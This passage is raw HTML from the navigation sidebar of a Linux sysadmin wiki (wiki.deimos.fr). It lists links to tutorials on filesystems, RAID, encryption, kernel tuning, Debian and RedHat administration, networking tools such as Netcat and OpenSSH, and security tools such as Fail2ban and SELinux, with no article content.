href=https://wiki.deimos.fr/Fluxbox_:_Arrondir_les_bords_de_toutes_les_fen%C3%AAtres/>Fluxbox: Rounded Corners for All Windows</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Compiz_:_Mise_en_place_d%27un_bureau_3D/>Compiz: Setting Up a 3D Desktop</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Filesystems & Storage</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
LVM</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Resizer_sa_swap/>Resize Swap</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Raid</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Configuration_d%27un_Raid_logiciel/>Software RAID Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Optimisation_des_filesystems_extX_et_du_RAID_sous_Linux/>Optimization of extX filesystems and RAID under Linux</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Linux_RAID_performances/>Linux RAID Performance</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/R%C3%A9cup%C3%A9rer_ses_donn%C3%A9es_depuis_un_RAID1_LVM/>Recovering Data from a RAID1 LVM</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Storage Encryption</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Luks_:_Chiffrer_ses_partitions/>LUKS: Encrypting Your Partitions</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Encfs_:_Mise_en_place_d%27Encfs_avec_FUSE/>EncFS: Setting up EncFS with FUSE</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Solutions_pour_un_syst%C3%A8me_LVM_crypt%C3%A9/>Solutions for Encrypted LVM System</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cryptoloop_:_Mise_en_place_d%27un_dossier_crypt%C3%A9/>Cryptoloop: Setting Up an Encrypted Folder</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/TrueCrypt:_Encryption_de_donn%C3%A9es_de_type_portables/>TrueCrypt: Portable Data Encryption</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/LVM_:_Utilisation_des_LVM/>LVM: Working with Logical Volume Management</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Optimiser_les_performances_des_disques_dur_sur_Linux/>Optimizing Hard Disk Performance on Linux</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Foremost_:_r%C3%A9cup%C3%A9rer_des_donn%C3%A9es_supprim%C3%A9es/>Foremost: Recover Deleted Data</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cloner_un_disque_dur/>Clone a Hard Drive</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/ACL:_Impl%C3%A9mentation_des_droits_de_type_NT_sur_Linux/>ACL: Implementing NT-type Permissions on Linux</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Autossh_:_reconnecter_automatiquement_un_tunnel_SSH/>AutoSSH: Automatically Reconnect SSH Tunnels</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Parted_:_r%C3%A9soudre_les_probl%C3%A8mes_de_partionnnement_sur_gros_filesystems/>Parted: Solving Partitioning Problems on Large Filesystems</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/BTRFS_:_Utilisation_du_rempla%C3%A7ant_de_l%27Ext4/>BTRFS: Using the Ext4 Replacement</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Tmpfs_:_un_filesystem_en_ram_ou_comment_%C3%A9crire_en_ram/>Tmpfs: RAM filesystem or how to write to RAM</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/ZFS_On_Linux_:_Mise_en_place_de_ZFS_sous_Linux/>ZFS On Linux: Setting up ZFS on Linux</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Smartmontool_:_Surveillance_des_disques_dur/>Smartmontools: Hard Drive Monitoring</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Scalpel_:_r%C3%A9cup%C3%A9rer_des_donn%C3%A9es_supprim%C3%A9es/>Scalpel: Recovering Deleted Data</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/O_par_une_application/>Limiting I/O usage by an application</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/SWAP_:_Cr%C3%A9ation_de_swap_dynamique/>SWAP: Creating Dynamic Swap</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Conversion_de_filesystems/>Filesystem Conversion</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/No_space_left_on_device_alors_qu%5C%27il_y_a_de_la_place/>No space left on device while there is space available</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Incron_:_ex%C3%A9cuter_des_actions_automatiques_lors_de_changements_d%27%C3%A9tats_d%27%C3%A9l%C3%A9ments/>Incron: Execute Automatic Actions When File States Change</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_des_quotas_sous_Linux/>Setting up quotas on Linux</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/anatomie-d-un-filesystem-linux/>Anatomy of a Linux Filesystem</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/AutoFsck_:_Changer_les_checks_filesystem_sur_Ubuntu/>AutoFsck: Changing Filesystem Checks on Ubuntu</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Testdisk_:_r%C3%A9cup%C3%A9rer_des_donn%C3%A9es_perdues/>TestDisk: Recovering Lost Data</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cr%C3%A9er_des_images_vierges_pour_tester_des_filesystems/>Creating Blank Images for Testing Filesystems</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Ext3_:_redimensionner_ses_partitions_sans_pertes_de_donn%C3%A9es/>Ext3: Resize partitions without data loss</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Hdparm_:_Optimiser_les_acc%C3%A8s_disques/>Hdparm: Optimizing Disk Access</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/fuse-refus-de-monter-les-disques-a-cause-de-dev-fuse/>FUSE: Unable to Mount Disks Due to /dev/fuse</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Firewalls</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/IP_Filter_:_Utilisation_du_firewall_sous_Solaris/>IP Filter: Using the Firewall on Solaris</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Kernel</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Recompiler_son_du_noyau_%28Kernel%29/>Recompile your kernel</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Latence_des_process_et_kernel_timing/>Process Latency and Kernel Timing</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Th%C3%A9orie_des_files_d%5C%27attentes/>Queueing Theory</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/La_gestion_de_la_m%C3%A9moire_sous_Linux/>Linux Memory Management</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Les_caches_m%C3%A9moire/>Memory Caches</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/L%27adressage_m%C3%A9moire_et_son_allocation/>Memory Addressing and Allocation</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Gestion_des_process_et_des_schedulers/>Linux Process and Scheduler Management</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Udev_:_Utilisation_d%27un_socket_pour_parler_avec_les_devices_kernel/>Udev: Using a Socket to Communicate with Kernel Devices</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Kexec_:_optimisez_vos_temps_de_boot/>Kexec: Optimize Your Boot Times</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Sysctl_:_configurer_les_options_kernel_sous_Linux/>Sysctl: Configuring Kernel Options in Linux</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/SystemTap_:_Profilez_et_utilisez_rapidement_des_fonctionnalit%C3%A9s_du_kernel/>SystemTap: Profile and Quickly Use Kernel Features</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OProfile_:_profilez_votre_syst%C3%A8me/>OProfile: Profile Your System</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/S%C3%A9curisation_de_son_noyau_avec_Grsecurity_et_PaX/>Securing Your Kernel with Grsecurity and PaX</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Gestion_des_process_zombies_sous_Linux/>Managing Zombie Processes in Linux</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/proc/>Understanding the Content of /proc</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Renforcement_des_fonctions_de_s%C3%A9curit%C3%A9_du_noyau_Linux/>Strengthening Linux Kernel Security Functions</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Initramfs_:_corriger_les_petits_probl%C3%A8mes_de_boot_kernel_gr%C3%A2ce_%C3%A0_initramfs/>Initramfs: Fixing Kernel Boot Issues with Initramfs</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Modifier_la_version_des_sources/>Modifying Source Version</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Connaitre_le_page_size_de_sa_machine/>How to Check the Page Size of Your Machine</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Kernel_:_Compilation_des_modules/>Kernel: Module Compilation</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Misc</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Debian</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cron-apt_:_Installation_des_mises_%C3%A0_jour_de_s%C3%A9curit%C3%A9_automatique/>Cron-apt: Automatic Security Updates Installation</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/How_to_use_old_Debian_repository_for_unmaintained_Debian_versions/>How to use old Debian repository for unmaintained Debian versions</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Integrit_:_Add_an_integrity_control_tool_on_your_Debian/>Integrit: Add an integrity control tool on your Debian</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Automatiser_une_installation_de_Debian/>Automate Debian Installation</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Debian_:_r%C3%A9installation_d%27un_serveur_presque_%C3%A0_l%27identique/>Debian: Reinstalling a Server Almost Identically</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/V%C3%A9rifier_l%27int%C3%A9grit%C3%A9_des_fichiers_sur_sa_Debian/>Checking File Integrity on Debian</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installer_Debian_sur_un_Mac_en_single_boot/>Installing Debian on a Mac in Single Boot</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Recompiler_un_soft_%C3%A0_la_sauce_Debian/>Recompile a Software the Debian Way</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Utilisation_avanc%C3%A9e_des_packages_Debian/>Advanced Usage of Debian Packages</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Modifier_la_fr%C3%A9quence_de_son_processeur/>Modifying CPU Frequency</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Drivers_Broadcom_et_Debian/>Broadcom Drivers and Debian</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cr%C3%A9er_un_repository_Debian/>Creating a Debian Repository</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Debian_:_Modification_des_outils_par_d%C3%A9faut_%28ex:_Editor%29/>Debian: Changing Default Tools (e.g., Editor)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Debian_:_Fini_les_erreurs_de_d%C3%A9pendances_quand_vous_voulez_configurer_des_sources/>Debian: No More Dependency Errors When Configuring From Source</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Debian_:_Erreur_GPG_lors_d%27apt-get_update/>Debian: GPG Error During apt-get update</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
RedHat</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Sosreport:%C2%A0g%C3%A9n%C3%A9rez%C2%A0et%C2%A0analysez%C2%A0des%C2%A0rapports%C2%A0de%C2%A0machine/>SoSReport: Generate and analyze machine reports</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cr%C3%A9er_un_package_RedHat_depuis_un_tar/>Creating a RedHat Package from a Tar File</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cr%C3%A9er_un_Kickstart_Red_Hat_pour_automatiser_les_installation/>Creating a Red Hat Kickstart to Automate Installations</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Yum_:_utilisation_des_packages_sous_RedHat/>Yum: Package Management in Red Hat</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Restaurer_les_permissions_d%5C%27une_Red_Hat/>Restore permissions on Red Hat</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/RPM_:_Build_a_binary_RPM_package_from_sources_on_Red_Hat/>RPM: Build a Binary RPM Package from Sources on Red Hat</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cr%C3%A9er_un_DVD_RedHat_%C3%A0_partir_des_CD/>Creating a RedHat DVD from CDs</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Systemd:_how_to_debug_on_boot_fail/>Systemd: How to Debug on Boot Failure</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Vagrant_:_quickly_deploy_virtual_machines/>Vagrant: Quickly Deploy Virtual Machines</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Sysstat_:_Des_outils_indispensable_pour_analyser_des_probl%C3%A8mes_de_performances/>Sysstat: Essential Tools for Analyzing Performance Issues</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Activer_le_port_s%C3%A9rie_sur_Linux/>Activating the Serial Port on Linux</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Grub_:_Utilisation_d%27un_bootloader/>GRUB: Using a Bootloader</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Se_connecter_par_port_serie_sur_sa_debian/>Connect to Debian via Serial Port</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/D%C3%A9sactiver_la_mise_en_veille_de_l%27%C3%A9cran_sur_Debian/>Disable Screen Standby on Debian</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/DrawIt_:_Une_extension_VIM_pour_faire_des_diagrammes_en_ASCII/>DrawIt: A VIM Extension for Creating ASCII Diagrams</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Conversion_de_Timestamp_en_Date/>Converting Unix Timestamp to Date</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/GS_:_Assembler_plusieurs_PDF_pour_n%27en_fait_qu%27un/>GS: Merge Multiple PDFs Into One</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Connaitre_le_temps_d%27ex%C3%A9cution_d%27une_ou_plusieurs_commandes/>Measuring Execution Time of One or Multiple Commands</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Envoie_de_mails_en_lignes_de_commandes/>Sending Emails from Command Line</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Sudo_:_Ex%C3%A9cuter_des_commandes_en_root_sans_l%27%C3%AAtre/>Sudo: Running commands as root without being root</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Manipuler_des_images_en_ligne_de_commande/>Manipulating Images via Command Line</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Obtenir_les_informations_hardware_d%27une_machine/>Getting Hardware Information from a Machine</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Linux_:_Lancement_des_d%C3%A9mons_au_boot/>Linux: Launching Daemons at Boot</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/IRC_:_Mise_en_place_d%27un_serveur_IRC_avec_UnrealIRCD_et_Anope_Services/>IRC: Setting up an IRC server with UnrealIRCD and Anope Services</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Comprendre_la_gestion_du_temps_sous_Linux/>Understanding Time Management in Linux</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/VirtualBox_:_Alternative_%C3%A0_Vmware/>VirtualBox: VMware Alternative</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Comprendre_le_fonctionnement_du_Load_Average/>Understanding Load Average</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installer_Mac_OS_X_et_ubuntu_en_dual_boot/>Installing Mac OS X and Ubuntu in Dual Boot</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Le_boot_de_Linux/>Linux Boot Process</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Remplacer_une_RedHat_install%C3%A9e_par_une_Debian_sans_formater/>Replacing an installed RedHat with Debian without formatting</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Activer_Desactiver_ecran_veille_ligne_commande/>Enabling and Disabling Screen Savers from Command Line</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Wine_:_Lancer_des_applications_windows_sur_linux/>Wine: Running Windows Applications on Linux</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/activer-le-pave-numerique/>Activating the Numeric Keypad</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Connaitre_sa_version_du_Bios_sans_rebooter/>How to Check BIOS Version Without Rebooting</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cr%C3%A9er_une_image_ISO/>Creating an ISO Image</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Gentoo_:_Utilisation_des_portages/>Gentoo: Using Portage</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Gentoo_:_Bien_commencer_avec_Gentoo/>Gentoo: Getting Started</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Informations_sur_la_m%C3%A9moire_vive/>RAM Information</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/D%C3%A9compressions_sous_diff%C3%A9rents_formats/>Uncompress for Different Formats</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Multimedia</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/SABnzbd_:_Une_interface_web_pour_g%C3%A9rer_les_newsgroups/>SABnzbd: A Web Interface for Managing Newsgroups</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Swith_audio_output_to_another_USB_device/>Switch audio output to another USB device</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Newznab_:_Mise_en_place_d%27un_indexeur_de_usenet/>Newznab: Setting up a Usenet Indexer</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Sick-Beard_:_Un_PVR_s%27appuyant_sur_SABnzbd/>Sick-Beard: A PVR Relying on SABnzbd</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Conversions_videos/>Video Conversions</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Utilisation_avanc%C3%A9e_de_Mediawiki/>Advanced Usage of MediaWiki</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Convertir_du_WMA_en_MP3/>Converting WMA to MP3</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Network</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Netcat</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Netcat_:_Transfert_de_fichiers/>Netcat: File Transfer</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Netcat_:_Cr%C3%A9er_un_port_d%27%C3%A9coute/>Netcat: Creating a Listening Port</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Netcat:%C2%A0utilisation/>Netcat: Usage</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Netcat_:_Sauvegarde_de_partions_%C3%A0_distance/>Netcat: Remote Partition Backup</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
OpenSSH</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/_Echange_de_clefs_SSH/>OpenSSH: SSH Key Exchange</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenSSH_:_Cr%C3%A9er_un_proxy_socks_en_SSH/>OpenSSH: Creating an SSH SOCKS Proxy</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenSSH_:_Tunneling_VPN/>OpenSSH : Tunneling VPN</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenSSH_:_Export_de_fen%C3%AAtre_graphiques/>OpenSSH: Graphical Window Forwarding</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenSSH:_using_stepstones/>OpenSSH: Using Stepstones</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenSSH:_Multiplexage_des_connexions_SSH/>OpenSSH: SSH Connection Multiplexing</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenSSH_HPN_%28High_Performance_Enabled%29_:_Impl%C3%A9mentation_et_installation/>OpenSSH HPN (High Performance): Implementation and Installation</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Dnsmasq_and_dhclient:_use_a_specific_DNS_for_a_specific_domain/>Dnsmasq and dhclient: use a specific DNS for a specific domain</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Trickle_:_limit_your_application_bandwidth/>Trickle: Limit Your Application Bandwidth</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Faire_clignoter_les_LEDs_d%27une_carte_r%C3%A9seau/>Make Network Card LEDs Flash</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Renommer_les_interfaces_r%C3%A9seaux_en_ethX/>Rename Network Interfaces to ethX</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Proxychains_:_proxyfier_n%27importe_quelle_connexion_vers_l%27ext%C3%A9rieur/>Proxychains: Proxy Any Outbound Connection</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/IP_:_La_commande_de_gestion_de_sa_carte_r%C3%A9seau/>IP: Network Interface Management Command</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/R%C3%A9seau_:_cr%C3%A9er_un_bonding/>Network: Creating Bonding</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cisco_VPN_Client_:_Installation_sur_une_Red_Hat_6/>Cisco VPN Client: Installation on Red Hat 6</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/afficher-les-machines-allumees-sur-le-reseau-courant/>Displaying Active Machines on the Current Network</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Connaitre_le_nombre_de_connections_par_IP/>Check Connections Per IP</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Bwm-ng_:_Mesurer_la_consommation_de_bande_passante_en_temps_r%C3%A9el/>Bwm-ng: Measure Bandwidth Consumption in Real Time</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/R%C3%A9solution_noms_DNS_FQDN_en_local/>DNS FQDN Name Resolution in Local Network</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Noyau_et_r%C3%A9seau_:_repousser_les_limites_de_la_connectivit%C3%A9/>Kernel and Network: Pushing the Limits of Connectivity</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Iperf_:_Tester_sa_bande_passante_de_bout_en_bout/>Iperf: Testing End-to-End Bandwidth</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/IPv6_:_Suppression_compl%C3%A8te,_IPv4_seulement/>IPv6: Complete Removal, IPv4 Only on Debian</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Configuration_d%27un_r%C3%A9seau_local_sur_Debian_et_Ubuntu/>Configuring a Local Network on Debian and Ubuntu</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Ifrename_:_renomer_ses_cartes_r%C3%A9seaux_sans_utiliser_udev/>Ifrename: Renaming Network Cards Without Using Udev</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Packages</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Debian</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/apt-ajouter-des-preferences-de-release-sur-certains-packages/>APT: Adding Release Preferences for Specific Packages</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/apt-aptitude-les-commandes-utiles/>Apt & Aptitude: Useful Commands</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/apt-cacher-ng-mise-en-place-d-un-proxy-pour-apt/>Apt-cacher-ng: Setting Up a Proxy for APT</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/apt-file-recherche-de-fichiers-qui-empechent-une-compilation/>Apt-file: Searching for Files That Prevent Compilation</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
RedHat</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/ajouter-le-dvd-red-hat-comme-repository/>Adding Red Hat DVD as a Repository</a></li></ul></div></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Security</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Fail2ban_:_mise_en_place_de_r%C3%A8gles_automatis%C3%A9es_iptables_pour_contrer_les_attaques_par_bruteforce/>Fail2ban: Implementing automated iptables rules to counter bruteforce attacks</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Acct_Le_keyfinder_par_excellence/>Acct: The Ultimate Keyfinder</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Lshell_:_limiter_les_possibilit%C3%A9s_du_shell/>Lshell: Limiting Shell Capabilities</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Ulimit_:_Utiliser_les_limites_syst%C3%A8mes/>Ulimit: Using System Limits</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Securiser_son_architecture_avec_SELinux/>Secure Your Architecture with SELinux</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Forcer_un_utilisateur_%C3%A0_changer_son_mot_de_passe_%C3%A0_la_premi%C3%A8re_connexion/>Force User to Change Password at First Login</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Crypter_et_d%C3%A9crypter_un_fichier_avec_OpenSSL/>Encrypt and Decrypt a File with OpenSSL</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Faire_freezer_une_machine_par_overload_CPU/>Freeze a Machine by CPU Overload</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Crypter_un_mot_de_passe_en_MD5/>Encrypting a Password with MD5</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/GnuPG:_Crypter_vos_emails/>GnuPG: Encrypt Your Emails</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Xinetd_:_S%C3%A9curiser_ses_services/>Xinetd: Securing Services</a></li></ul></div></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">dns</i>
Mac OS</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Applications</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Monter_des_images_disque_en_ligne_de_commande/>Mount Disk Images from Command Line</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Hdiutil_:_Cr%C3%A9er_un_ISO_DVD_depuis_un_dossier_VIDEO_TS/>Hdiutil: Creating a DVD ISO from a VIDEO TS folder</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Coding</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Compiler_avec_gcc_sur_plusieurs_architectures_%28ex:_PPC_et_Intel%29/>Compiling with GCC on Multiple Architectures (e.g., PPC and Intel)</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Hardware</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Calibrer_la_batterie_de_son_portable/>Calibrating Your Laptop Battery</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
